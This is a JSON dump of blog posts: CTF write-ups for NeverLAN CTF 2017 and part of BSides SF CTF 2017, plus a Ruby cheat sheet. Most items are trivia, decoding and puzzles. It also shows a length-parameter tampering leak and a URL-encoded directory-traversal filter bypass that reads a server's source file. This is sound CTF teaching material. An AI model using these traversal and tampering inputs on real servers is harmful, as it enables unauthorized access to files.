Write-ups","slug":"NeverLAN-CTF-2017-write-ups","date":"2017-02-26T23:00:00.000Z","updated":"2017-02-27T22:29:30.548Z","comments":true,"path":"en/NeverLAN-CTF-2017-write-ups/","link":"","permalink":"https://rawsec.ml/en/NeverLAN-CTF-2017-write-ups/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : NeverLAN CTF 2017 Website : neverlanctf.com Type : Online Format : Jeopardy CTF Time : link 50 - Encoding Apprentice - Trivia What common encoding practice’s title contains the square of 8 and occasionally ends with an “=”, or “==”? Answer: base64 50 - Shifty Ciphers… - Trivia What cipher is the shiftiest of them all? He even has his own salad… Answer: caesar 50 - Know your extensions - Trivia Unix and Linux use this (instead of a file extension) to determine what format a file is. Answer: magic numbers 50 - Mmmm... SSL - Trivia What is the standard, secure, size of an ssl certificate? Answer: 2048 50 - Don't eat me - Trivia I allow HTTP to act as a stateful protocol instead of the stateless protocol it actually is. Just a small piece of data sent from a website... Answer: cookie 50 - NeverLAN - Recon We've been known to leak things on twitter... Go to NeverLanCTF twitter: https://twitter.com/NeverLanCTF There is an interesting twitter status: 1Rnfl erpba vf rnfl. synt&#123;vas0ezngvba_vf_c0jre_xa0j_l0he_nqirefnel&#125; #CommonCaeserCipher I tried a rot13 and I got that: 1Easy recon is easy. flag&#123;inf0rmation_is_p0wer_kn0w_y0ur_adversary&#125; Flag is inf0rmation_is_p0wer_kn0w_y0ur_adversary. 100 - Purvesta - Recon Purvesta also really likes his twitter... NeverLAN CTFTime page: https://ctftime.org/team/32118 purvesta CTFtime page: https://ctftime.org/user/23157 purvesta name is: Tanner Purves, his LinkedIn page is not working. So I searched for twitter Tanner Purves and found his twitter page @purvesta0704. His twitter descripton says: 1\\\\\\BSU &apos;20, Co-founder of the NeverLAN CTF/// &#123;ZmxhZ3tXMHdfeTB1X0FyM19HZXR0aW5nX2cwMGRfYXRfVGhpNX0=&#125; It looks like a base64 string: 12$ printf %s &apos;ZmxhZ3tXMHdfeTB1X0FyM19HZXR0aW5nX2cwMGRfYXRfVGhpNX0=&apos; | base64 -dflag&#123;W0w_y0u_Ar3_Getting_g00d_at_Thi5&#125; 50 - SoYouLikeMusic - Forensics SoYouLikeMusic.class We can use strings on the java class: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455$ strings SoYouLikeMusic.classscanLjava/util/Scanner;&lt;init&gt;CodeLineNumberTablemain([Ljava/lang/String;)VdecompilingTheCodeNowqOneStackMapTableqTwoqThreeplayGameSourceFileSoYouLikeMusic.javajava/util/ScannerOAhh welcome... so I hear you like music? What might I call you fellow listener?java/lang/StringBuilderWell4, let&apos;s play a game and see how much you like music.UWho was the special artist to dj music for our live streams before the event started? s7a73farmTry Again...@Now you are on a roll! What is zestyfe&apos;s favorite type of music?dubstep=Final Question! What is the name of purvesta&apos;s only rap song?The_Gettysburg_Address_Rap|I will ask you three questions. If you can answer them all right, then I will point you towards your precious flag you seek!Want to play? (y/n);Great let&apos;s play! (ctrl-c if you really don&apos;t want to play)Congratulations!! You did it!!8ZmxhZ3tTdGlsbF9XYWl0aW5nX09uX3B1cnZlc3RhJ3NfTWl4dGFwZX0=SoYouLikeMusicjava/lang/Objectjava/lang/Stringjava/lang/SystemLjava/io/InputStream;(Ljava/io/InputStream;)VLjava/io/PrintStream;java/io/PrintStreamprintln(Ljava/lang/String;)VnextLine()Ljava/lang/String;trimappend-(Ljava/lang/String;)Ljava/lang/StringBuilder;toStringequals(Ljava/lang/Object;)ZequalsIgnoreCase(Ljava/lang/String;)Zexit(I)V Focus on: 12Congratulations!! You did it!!8ZmxhZ3tTdGlsbF9XYWl0aW5nX09uX3B1cnZlc3RhJ3NfTWl4dGFwZX0= That looks like base64: 12printf %s &apos;8ZmxhZ3tTdGlsbF9XYWl0aW5nX09uX3B1cnZlc3RhJ3NfTWl4dGFwZX0=&apos; |base64 -d񙱅��Mѥ��&#125;]��ѥ��&#125;=�&#125;���ٕ�ф��&#125;5��х���base64: invalid input That's wrong let's execute the java class, we know teh answers: 12345678910111213141516171819202122$ java -cp . SoYouLikeMusicAhh welcome... so I hear you like music? What might I call you fellow listener?alexWell alex, let&apos;s play a game and see how much you like music.I will ask you three questions. If you can answer them all right, then I will point you towards your precious flag you seek!Want to play? (y/n)yGreat let&apos;s play! (ctrl-c if you really don&apos;t want to play)Who was the special artist to dj music for our live streams before the event started?s7a73farmNow you are on a roll! What is zestyfe&apos;s favorite type of music?dubstepFinal Question! What is the name of purvesta&apos;s only rap song?The_Gettysburg_Address_RapCongratulations!! You did it!!ZmxhZ3tTdGlsbF9XYWl0aW5nX09uX3B1cnZlc3RhJ3NfTWl4dGFwZX0= There was only a 8 before our base64 string: 12$ printf %s &apos;ZmxhZ3tTdGlsbF9XYWl0aW5nX09uX3B1cnZlc3RhJ3NfTWl4dGFwZX0=&apos; | base64 -diflag&#123;Still_Waiting_On_purvesta&apos;s_Mixtape&#125; Note: This is not forensics. 300 - just-a-selfie - Forensics You've been put in charge of a very secret project. There's talk that some of your data has leaked out. Your security analyst has flagged this email as &quot;out of place&quot;. Has your company been breached? Hmm.. Binwalk. Now that's a useful tool! 12$ file email.txtemail.txt: SMTP mail, ASCII text This is a mail with a attached image. 12345678--Apple-Mail=_9C94B8C8-A2CF-4892-8E1B-A89A4C3EAE03Content-Transfer-Encoding: base64Content-Disposition: inline; filename=selfie.jpgContent-Type: image/jpeg; x-unix-mode=0644; name=&quot;selfie.jpg&quot;Content-Id: &lt;456C033A-8B84-4975-B1DC-3E5820C8993A@death.star&gt; The image is base64 encoded, and split between line 92 and line 12617. Of course, binwalk is useless here: 12345678910111213141516171819202122232425261369 0x559 HTML document header4003 0xFA3 HTML document footer9689 0x25D9 Unix path: /WqckbqxDJsHoQRUjuIXZONp/Kk81v7p/KjzN4BFG73qguf/0Pu911085 0x2B4D Unix path: /4RD4Z6ZCUZZplNxIrjBy/I/QgV9N/DfxvL4aeO+t013229 0x33AD Unix path: /ENn/Y/huxtvl8wx5Yrjljz/XFcVZQtPdqFRpH3DhFzntj8eK7L4h313284 0x33E4 Unix path: /nakVUgImCE9BjOK2f2dPAx8c/F/w/p+zfD9pW4kA4+SP5mz7dK8OeIjhsJKtN7Js/Sc0pxnmnsl14560 0x38E0 Unix path: /wCEI0L/AJ8I/wDvqtxbcOoY/KTz6Uv215287 0x3BB7 Unix path: /qK6f4i/C/VfHGu/wBs+MdbXXmhwEuZIRFIUAGAQuOn1P0rxLRVlc+hdp6rRI8RvvDfhTxRpk8h22696 0x58A8 Unix path: /8E/Ke8hMUKjeWAOBkde/9c/jVZIhnPfvmr2or8qZwpPJHFVQm7ngjsDWt23242 0x5ACA Unix path: /jivyX2F9h6LjJ/P/J/GvqMszD+0Kcm1ZrcqbhUh7WGielgaMcY25527 0x63B7 Unix path: /VX4Z/sceA/B/hq2iksI7rUFjAedu/Gf5ivMlZaHq+1jSXNI/P8A+FHxw1DwhrDWGlBbnT3bZLay26919 0x6927 Unix path: /g9Ya7q2iG9/4SKO4Xz1zss1b/AFYcehBbrXxjjLmaPufiimmec/DD4VaN4j1K8uIbWym129935 0x74EF Unix path: /AI/pTd3IVudkZwoPsWP/AI7X2XdzLDG7M20AE5r8q/2lvHLfED4yeIL/33346 0x8242 Unix path: /8d2V8h6gAHRADuC54969P/aJ8X/8ACc/H35802 0x8BDA Unix path: /KvZNS/bO8a61EBdzJLFghkZuAOR1/Ovn74k/FC58Q36928 0x9040 Unix path: /klCp/1gIwfY1z2sSrIxWX5to/vYrQ4iLU/FsiXLyLB5MucoAPlj/xrKufEV1e4S4K/NyGB42880 0xA780 Unix path: /a/E/hDRQwxbWk1y/PQu4Uf+i/1r4a1Ihrjysj93x07100aM43257 0xA8F9 Unix path: /Z8yuKjGpSany/ebZ8P6bqWDG/2Vm/ij5H5Gsq/8K3FmC0bxzpuyD0Ki49189 0xC025 Unix path: /rtr4UWLzdoB3Z/Kvfv2z/GR8UfGaewhfdaaLAtoo3Y/eHDuf1A/C50244 0xC444 Unix path: /ljkcgHrV/RNXOm6pFLjMT/LKnHzr3WgpMr5AA2/xVteG5f3k0bN6HH+fwqprmnHTbwmI7rOb95B53176 0xCFB8 Unix path: /8E7tBW30/xJrEsflyTMlvE5/iGSWA/Ja+HzKq6OAqS6yP0PMKqipQh9iKXzPt7Tvml5rY55034 0xD6FA Unix path: /wBivxnBfOmn6hp91bfwySPsY/UGqX/DGPxA/wCfjTP+/wAK+8fIP90n8KPI60216 0xEB38 Unix path: /TRd66LiUARWaeeWI6sDhV/U/lT/F1+19qUuO65339 0xFF3B Unix path: /AMBrzL/hb3ib/oI3X5mvAdFXPSWHbSZ//9P4g8A+Ab3VNM1HxQztJpem3kFoSSMvNKrlVwOw67005 0x105BD StuffIt Deluxe Segment (data): fpW74o1EL5VrGoBI3PhRkc[...] So let's extract the base64 string, join it, decode it and save the ouput in a file (with a ruby script of course). 12345678910111213141516171819require \"base64\"line_no = 1selfie_b64 = \"\"File.open(\"email.txt\", 'r') do |file| file.each do |line| if line_no &gt;= 92 &amp;&amp; line_no &lt;= 12617 selfie_b64 += line.chomp end line_no += 1 endendselfie_plain = Base64.decode64(selfie_b64)File.open(\"selfie.jpg\", 'w') do |file| file.write(selfie_plain)end I obtained this picture: 12$ file selfie.jpgselfie.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 72x72, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=2, orientation=upper-left], baseline, precision 8, 820x618, frames 3 This image seems to hide something else (trailing data): 12345678910$ binwalk selfie.jpgDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 JPEG image data, JFIF standard 1.0130 0x1E TIFF image data, big-endian, offset of first image directory: 8128969 0x1F7C9 Zip archive data, at least v2.0 to extract, name: Death_Star_Owner&apos;s_Technical_Manual_blueprints.jpg712883 0xAE0B3 Zip archive data, at least v1.0 to extract, name: __MACOSX/712938 0xAE0EA Zip archive data, at least v2.0 to extract, name: __MACOSX/._Death_Star_Owner&apos;s_Technical_Manual_blueprints.jpg713908 0xAE4B4 End of Zip archive Then I extracted it with foremost and unzip the archive: 12345$ unzip 00000251.zipArchive: 00000251.zip inflating: Death_Star_Owner&apos;s_Technical_Manual_blueprints.jpg creating: __MACOSX/ inflating: __MACOSX/._Death_Star_Owner&apos;s_Technical_Manual_blueprints.jpg Finally, I get this Death Star Elevation Plan: Flag is rebellions_are_built_on_hope. Note: This is steganography, not forensics. 100 - TheHistoryOfCryptography - Cryptography The_History_of_Cryptography.zip contains two files: 0.txt and 1.zip : 12$ cat 0.txtThis Shifty Cipher is one of the simplest, and most well know ciphers. Answer: caesar The zip is password protected and the password is the answer of 0.txt. 1.zip contains 2 files: 1.txt and 2.zip, and so on. 1234$ cat 1.txtThis Cipher is is named after the person who made it famous, not but the man who first created it.Password:&quot;The name of cipher in the riddle&quot; with out the quotes. Answer: vigenere 1234$ cat 2.txtThis transposition cipher was used by the warriors in the famous movie &quot;the 300&quot;PassWord:&quot;The name of cipher in the riddle&quot; with out the quotes. Answer: scytale 1234$ cat 3.txtThe first recorded use of this cipher was used to hide a book of magic.Password:&quot;The name of cipher in the riddle&quot; with out the quotes. Answer: steganography (details) 1234$ cat 4.txtThis world famous cipher was invented by Arthur ScherbiusPassword:&quot;The name of cipher in the riddle&quot; with out the quotes. Answer: enigma machine (details) 123$ cat 5.txtWhich one is you&apos;re favorite? I love them all because...flag&#123;THEHISTORYOFCRYPTOGRAPHYISAW3S0M3&#125; Flag is THEHISTORYOFCRYPTOGRAPHYISAW3S0M3. Note: this challenge was a quizz, not a cryptography challenge. It should have been in Trivia, Misc, Quizz or Other. 100 - A Slight Cut - Web http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123/ Source: 123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;A slight cut&lt;/title&gt; &lt;script src=&quot;js/jquery.js&quot;&gt;&lt;/script&gt; &lt;script&gt;[...] &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;h1&gt;type in some text to have the server repeat it back&lt;/h1&gt; &lt;form onsubmit=&quot;getEcho(); return false;&quot;&gt; &lt;input id=&quot;text&quot; name=&quot;text&quot; type=&quot;text&quot; placeholder=&quot;type some text here&quot;/&gt; &lt;input id=&quot;length&quot; type=&quot;hidden&quot; name=&quot;length&quot; value=&quot;0&quot;/&gt; &lt;input type=&quot;submit&quot;/&gt; &lt;/form&gt; &lt;p id=&quot;echo&quot;&gt;output will appear here&lt;/p&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; There is two parameters in te request url: length and text. text comes from the input field, and length is calculated with javascript. 123456789101112function getEcho()&#123; var text = $('#text').val(); var length = $('#length').val(); $.ajax('echo.php?length='+length+'&amp;text='+text).done(function(echoed)&#123; $('#echo').text(echoed); &#125;);&#125;$(document).ready(function()&#123; $('#text').on('input', function()&#123; $('#length').val($('#text').val().length); &#125;);&#125;); If I submit A, the calculated length is 1. 123456789GET /echo.php?length=1&amp;text=A HTTP/1.1Host: neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123/X-Requested-With: XMLHttpRequestConnection: close But what will happen if I change the value from 1 to 1000 with Burp: 1GET /echo.php?length=1000&amp;text=A HTTP/1.1 The server displays more than intended: 1Auo$@uyc kds2^4a ady 5 tyusft tuyuy_#65afajty ajb tjuflt ty%&amp;(juuyttyjtji KEY: flag&#123;bleeding_in_javascript&#125; SDF4 asd6f ayj1dsgff@ af ttmtum56tu$%ga wrg3@#%aa9-mtyumty dfgsaumg68g$%ershe as 9tuyt t9uty38dsdfg-5f htyd45s#$ Flag is: bleeding_in_javascript. 300 - WebCipher - Web #anti-human http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:7129/ word list: https://s3-us-west-2.amazonaws.com/neverlanctf/files/words.txt Source: 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;anti-human cipher&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"cipher_box\"&gt; &lt;h1 id=\"cipher\"&gt;shhsjwfl&lt;/h1&gt; &lt;/div&gt; &lt;div id=\"form_box\"&gt; &lt;form id=\"form\" method=\"GET\" action=\"?\"&gt; &lt;input type=\"text\" name=\"deciphered\" id=\"deciphered\"/&gt; &lt;input type=\"submit\"/&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; First thing is to understand what to do. Here is what the server do: A word is picked up randomly from words.txt This word is randomly rotated (Caesar cipher with a shift between 1 and 25) Then the shifted word is displayed for a few seconds A new word is picked up and so on... So we need a script that: Get the shifted word Cross the dictionary and test words one by one (only same length as teh shifted word) For each tested word try all possible shifting Break when that match Send the answer (decipered/unshifted word) Get the flag So that's what I did with a ruby script and curb: 123456$ ruby webcipher.rb• Connexion works• Cracking ciphered word• Deciphered: cassidony• Sending answer• Flag: c34s3r_c1ph3r_70_7h3_m4x My ruby script: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!/usr/bin/env rubyrequire 'curb' # for get/post requests# from https://gist.github.com/matugm/db363c7131e6af27716cdef caesar_cipher(string, shift = 1) alphabet = Array('a'..'z') encrypter = Hash[alphabet.zip(alphabet.rotate(shift))] string.chars.map &#123; |c| encrypter.fetch(c, \" \") &#125;endhostname = 'http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:7129/index.php'c = Curl::Easy.new(hostname) do |curl| curl.headers['Cookie'] = 'PHPSESSID=30ff4361f8af2985595bff7c9614b1f1' curl.headers['Referer'] = hostname curl.headers['Upgrade-Insecure-Requests'] = '1' #curl.verbose = trueend # Curlc.perform # send the requestif c.body_str.match(/anti\\-human cipher/) puts '• Connexion works'end# get the cipher wordciphered_word = c.body_str.match(/&lt;h1 id=\"cipher\"&gt;([a-zA-Z]*)&lt;\\/h1&gt;/).captures[0]ciphered_word.downcase! # put lowercaseciphered_word_length = ciphered_word.lengthputs '• Cracking ciphered word'do_break = falseanswer = \"\"File.open(\"words.txt\", 'r') do |file| file.each do |word| word.chomp! # remove spaces if word.length.eql?(ciphered_word_length) # only try word with same length answer = word # save the word because it can be mixed case word.downcase! # put lowercase # puts \"word: #&#123;word&#125;\" (1..25).each do |i| # puts caesar_cipher(word, i).join if caesar_cipher(word, i).join == ciphered_word puts \"• Deciphered: #&#123;word&#125;\" do_break = true break end end end break if do_break endendputs \"• Sending answer\"c.url = hostname.concat(\"?deciphered=#&#123;answer&#125;\")c.performputs \"• Flag: \".concat(c.body_str.match(/&lt;p&gt;flag&#123;(.*)&#125;&lt;\\/p&gt;/).captures[0]) Note: This is not web, this is scripting. 50 - Master Mind 1 - Other Can you break my three digit lock? MasterMind1.txt Source: 12345678910111213141516171819202122+-----------------------+| | | || 7 | 3 | 6 | One number is correct but wrongly placed| | | ||_______|_______|_______|| | | || 0 | 6 | 5 | One number is correct and correctly placed| | | ||_______|_______|_______|| | | || 3 | 7 | 2 | Two numbers are correct but wrongly placed| | | ||_______|_______|_______|| | | || 6 | 4 | 7 | No numbers are correct| | | ||_______|_______|_______|| | | || 5 | 2 | 4 | One number is correct and correctly placed| | | || | | |+-----------------------+ Rules: Mastermind Code-breaking: Line 4: 647, No numbers are correct =&gt; [0,1,2,3,5,8,9] are possible Line 1: 736, One number is correct but wrongly placed =&gt; 7 and 6 are wrong, so 3 is in the code and is right or left Line 2: 065, One number is correct and correctly placed =&gt; 6 is wrong, so 0 or 5 is in the code and corrctly placed Line 3: 372, Two numbers are correct but wrongly placed =&gt; 7 is wrong, 3 and 2 are good so [3,2,[0|5]] are possible Line 5: 524, One number is correct and correctly placed =&gt; Only one number is correct, 2 is good so 5 is wrong and [3,2,0] are possible (We have the three numbers so now let's order them) Line 5: 524, One number is correct and correctly placed =&gt; 2 is middle Line 2: 065, One number is correct and correctly placed =&gt; 0 is left So 3 is right Flag is 023. 100 - Master Mind 2 - Other I've upgraded my lock! Can you solve it? MasterMind2.txt Source: 12345678910111213141516171819202122+-------------------------------+| | | | || 9 | 5 | 3 | 2 | One number is correct but wrongly placed| | | | ||_______|_______|_______|_______|| | | | || 1 | 6 | 7 | 3 | Two numbers are correct and correctly placed| | | | ||_______|_______|_______|_______|| | | | || 0 | 6 | 5 | 9 | Two numbers are correct but wrongly placed| | | | ||_______|_______|_______|_______|| | | | || 2 | 4 | 3 | 8 | No numbers are correct| | | | ||_______|_______|_______|_______|| | | | || 5 | 2 | 4 | 0 | One number is correct and correctly placed| | | | || | | | |+-------------------------------+ Rules: Mastermind Code-breaking: Line 4: 2438, No numbers are correct =&gt; Only [0,1,5,6,7,9] are possible Line 5: 5240, One number is correct and correctly placed =&gt; 2 and 4 are wrong, so 0 or 5 is in the code, [[0|5],1,6,7,9] Line 1: 9532, One number is correct but wrongly placed =&gt; 2 and 3 are wrong, so 9 or 5 is good, [0|5] &amp; [5|9] = 5 so [1,5,6,7] OR [0|5] &amp; [5|9] = [0,9] so so [0,1,6,7,9] Line 2: 1673, Two numbers are correct and correctly placed =&gt; Only two number are good so [1,5,6,7] impossible so [0,1,6,7,9] is only possible (Now we need to filter the 5 numbers to keep only 4) Line 1: Confirmed [9], Possible [0,1,6,7] Line 3: Confirmed [9,[0|6]], Possible [1,7] Line 5: Confirmed [9,0], Possible [1,7] so [0,1,7,9] are the four numbers (We have the four numbers so now let's order them) Line 2: Place [1,x,7,x] Line 5: Place [1,x,7,0] so [1,9,7,0] Flag is 1970.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"Ruby cheat sheet with examples","slug":"Ruby-cheat-sheet-with-examples","date":"2017-02-19T23:00:00.000Z","updated":"2017-02-21T22:56:18.223Z","comments":true,"path":"en/Ruby-cheat-sheet-with-examples/","link":"","permalink":"https://rawsec.ml/en/Ruby-cheat-sheet-with-examples/","excerpt":"","text":"Take it easy Ruby! Basic concepts Hello World 1puts \"Hello World!\" Comments 123456# single line comment=begin Multi-lines comment=end Variables 12my_var = 42My_constant_var = 31337 Shorthand assignment 123456a += b # a = a + ba -= b # a = a - ba *= b # a = a * ba /= b # a = a / ba %= b # a = a % ba **= b # a = a**b Parallel assignment 1a, b, c = 11, 22, 33 Input 1input = gets Control structures Equality 1234irb(main):001:0&gt; 42 == 42.0 # equal values=&gt; trueirb(main):002:0&gt; 42.eql?(42.0) # equal values and same type=&gt; false Subsumption Be cautious! 1234567891011121314151617181920irb(main):004:0&gt; 42 === (10..100)=&gt; falseirb(main):005:0&gt; 42 === (50..100)=&gt; falseirb(main):006:0&gt; (10..100) === 42=&gt; trueirb(main):007:0&gt; (50..100) === 42=&gt; falseirb(main):008:0&gt; Integer === 42=&gt; trueirb(main):009:0&gt; Integer === 'string'=&gt; falseirb(main):010:0&gt; 42 === Integer=&gt; falseirb(main):011:0&gt; /at/ === 'Hi mate'=&gt; trueirb(main):012:0&gt; /at/ === 'Hello'=&gt; falseirb(main):013:0&gt; 'Hi mate' === /at/=&gt; false if/elsif/else statement 1234567891011val = 1337if val == 42 puts \"That's always true\"elsif val == 1000 puts \"Nearly right\"elsif val == 1300 puts \"Even closer\"else puts \"Nah!!\"end# ouput: Nah! unless statement Opposite of if 1234567val = 1337unless val == 1337 puts \"Your're the elite!\"else puts \"Master!\"end# output: Master! Logical operators Symbol Word &amp;&amp; and || or ! not case statement 12345678910111213141516a = 10case awhen 1 puts 'One'when 2 puts 'Two'when 5 puts 'Five'when 10 puts 'Ten'when 42, 1337, 31337 puts 'Master!'else puts 'Nah!'end# output: Ten while loop 12345a = 0while a &lt;= 5 puts a a += 1end until loop 12345a = 0until a &gt; 5 puts a a += 1end Ranges 12345678irb(main):043:0&gt; (41..43).to_a=&gt; [41, 42, 43]irb(main):044:0&gt; (41...43).to_a=&gt; [41, 42]irb(main):045:0&gt; ('m'..'o').to_a=&gt; [\"m\", \"n\", \"o\"]irb(main):046:0&gt; ('y'..'b').to_a=&gt; [] for loop 123for i in (1..10) puts \"i: #&#123;i&#125;\"end break 1234for i in (1..10) break if i &gt; 5 puts \"i: #&#123;i&#125;\"end next 1234for i in (1..10) next if i % 2 == 0 puts \"i: #&#123;i&#125;\"end loop do Like a do while in others languages. 123456a = 0loop do puts a a += 1 break if a &gt; 10end Collections Arrays 1234567891011121314151617181920212223242526272829303132333435363738394041# Basicsirb(main):047:0&gt; peoples = [\"Alice\", \"Bob\", \"Eve\"]=&gt; [\"Alice\", \"Bob\", \"Eve\"]irb(main):048:0&gt; peoples[0]=&gt; \"Alice\"irb(main):049:0&gt; peoples[1]=&gt; \"Bob\"irb(main):050:0&gt; peoples[-1]=&gt; \"Eve\"# Adding elementsirb(main):051:0&gt; foo = [42, \"Cindy\", 0.02, true]=&gt; [42, \"Cindy\", 0.02, true]irb(main):052:0&gt; foo &lt;&lt; 'd'=&gt; [42, \"Cindy\", 0.02, true, \"d\"]irb(main):053:0&gt; foo.push(1337)=&gt; [42, \"Cindy\", 0.02, true, \"d\", 1337]irb(main):055:0&gt; foo.insert(2, 0.05)=&gt; [42, \"Cindy\", 0.05, 0.02, true, \"d\", 1337]irb(main):056:0&gt; foo.pop=&gt; 1337irb(main):057:0&gt; foo=&gt; [42, \"Cindy\", 0.05, 0.02, true, \"d\"]irb(main):060:0&gt; foo.delete_at(2)=&gt; 0.05irb(main):061:0&gt; foo=&gt; [42, \"Cindy\", 0.02, true, \"d\"]# Removing elementsirb(main):065:0* puts foo42Cindy0.02trued=&gt; nilirb(main):066:0&gt; print foo[42, \"Cindy\", 0.02, true, \"d\"]=&gt; nil# Array Rangesirb(main):068:0* alph = ['a', 'c', 'z', 'e']=&gt; [\"a\", \"c\", \"z\", \"e\"]irb(main):069:0&gt; alph[1..3]=&gt; [\"c\", \"z\", \"e\"] Array manipulations 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# Combining arraysirb(main):072:0&gt; x = [41, 53]=&gt; [41, 53]irb(main):073:0&gt; y = [72, 16, 133]=&gt; [72, 16, 133]irb(main):074:0&gt; res = x + y=&gt; [41, 53, 72, 16, 133]irb(main):075:0&gt; res = y + x=&gt; [72, 16, 133, 41, 53]irb(main):078:0&gt; z = [16, 41, 55]=&gt; [16, 41, 55]irb(main):079:0&gt; res - z=&gt; [72, 133, 53]# Boolean operationsirb(main):081:0&gt; x=&gt; [41, 53]irb(main):082:0&gt; z=&gt; [16, 41, 55]irb(main):083:0&gt; x &amp; z=&gt; [41]irb(main):085:0&gt; x | z=&gt; [41, 53, 16, 55]# Moving elementsirb(main):086:0&gt; z.reverse=&gt; [55, 41, 16]irb(main):087:0&gt; z=&gt; [16, 41, 55]irb(main):088:0&gt; z.reverse!=&gt; [55, 41, 16]irb(main):089:0&gt; z=&gt; [55, 41, 16]# Array methodsirb(main):090:0&gt; z.length=&gt; 3irb(main):091:0&gt; z.size=&gt; 3irb(main):092:0&gt; z.sort=&gt; [16, 41, 55]irb(main):093:0&gt; c = [42, 42, 75, 42]=&gt; [42, 42, 75, 42]irb(main):094:0&gt; c.uniq=&gt; [42, 75]irb(main):095:0&gt; z.freeze # prevent from being modified, there is no unfreeze method=&gt; [55, 41, 16]irb(main):096:0&gt; z.popRuntimeError: can't modify frozen Array from (irb):96:in 'pop' from (irb):96 from /usr/bin/irb:11:in `&lt;main&gt;'irb(main):102:0&gt; z.frozen?=&gt; trueirb(main):103:0&gt; z.include?(55)=&gt; trueirb(main):104:0&gt; z.include?(56)=&gt; falseirb(main):105:0&gt; z.min=&gt; 16irb(main):106:0&gt; z.max=&gt; 55 Hashes and symbols || a b || pipe pipe | pipe","categories":[{"name":"programming","slug":"programming","permalink":"https://rawsec.ml/categories/programming/"},{"name":"ruby","slug":"programming/ruby","permalink":"https://rawsec.ml/categories/programming/ruby/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"programming","slug":"programming","permalink":"https://rawsec.ml/tags/programming/"},{"name":"ruby","slug":"ruby","permalink":"https://rawsec.ml/tags/ruby/"}]},{"title":"BSides San Francisco CTF 2017 - Write-ups","slug":"BSides-San-Francisco-CTF-2017-write-ups","date":"2017-02-12T23:00:00.000Z","updated":"2017-02-09T19:45:29.293Z","comments":true,"path":"en/BSides-San-Francisco-CTF-2017-write-ups/","link":"","permalink":"https://rawsec.ml/en/BSides-San-Francisco-CTF-2017-write-ups/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : BSides San Francisco CTF 2017 Website : ctf.bsidessf.com Type : Online Format : Jeopardy CTF Time : link 1 - Hackers - Misc Hack the __! Answer: planet 20 - NOP - Misc x86's NOP is actually another instruction. What is the Intel syntax representation of the assembly of the other instruction? Include a space between operands, if applicable. Answer: xchg eax, eax Details 1 - Ancient Hop Grain Juice - Misc This beverage, brewed since ancient times, is made from hops and grains? Answer: beer 1 - The Wrong Cipher - Misc This cipher was used incorrectly in WEP Answer: RC4 Details 1 - The Right Cipher - Misc This cipher was correctly used in TKIP Answer: RC4 Details 1 - Let's play a game - Misc This is the name of the game that a young hacker thinks he's playing with the WOPR Supercomputer. [Spaces expected] Answer: Global Thermonuclear War Details 1 - Quote - Misc This movie featured the memorable phrase &quot;My voice is my passport&quot; Answer: Sneakers Movie 20 - Zumbo 1 - Web Welcome to ZUMBOCOM....you can do anything at ZUMBOCOM. Three flags await. Can you find them? http://zumbo-8ac445b1.ctf.bsidessf.net Stages 2 and 3 - coming soon! View source of http://zumbo-8ac445b1.ctf.bsidessf.net/index.template 1&lt;!-- page: index.template, src: /code/server.py --&gt; Let's check the /code/server.py path: http://zumbo-8ac445b1.ctf.bsidessf.net/code/server.py. We get an error: 12[Errno 2] No such file or directory: u&apos;code/server.py&apos;&lt;!-- page: code/server.py, src: /code/server.py --&gt; Every non-existing page give the same error. We need to do a directory traversal: http://zumbo-8ac445b1.ctf.bsidessf.net/../../../../code/server.py. But unfortunately the ../../../../ part is automatically removed. So I just URLencoded this part to bypass the filter: http://zumbo-8ac445b1.ctf.bsidessf.net/..%2F..%2F..%2F..%2Fcode/server.py. And we get the server.py source: 12345678910111213141516171819202122232425262728293031323334import flask, sys, osimport requestsapp = flask.Flask(__name__)counter = 12345672@app.route('/&lt;path:page&gt;')def custom_page(page): if page == 'favicon.ico': return '' global counter counter += 1 try: template = open(page).read() except Exception as e: template = str(e) template += \"\\n&lt;!-- page: %s, src: %s --&gt;\\n\" % (page, __file__) return flask.render_template_string(template, name='test', counter=counter);@app.route('/')def home(): return flask.redirect('/index.template');if __name__ == '__main__': flag1 = 'FLAG: FIRST_FLAG_WASNT_HARD' with open('/flag') as f: flag2 = f.read() flag3 = requests.get('http://vault:8080/flag').text print \"Ready set go!\" sys.stdout.flush() app.run(host=\"0.0.0.0\")&lt;!-- page: ../../../../code/server.py, src: /code/server.py --&gt; Flag was FLAG: FIRST_FLAG_WASNT_HARD. PS: Only page is used so 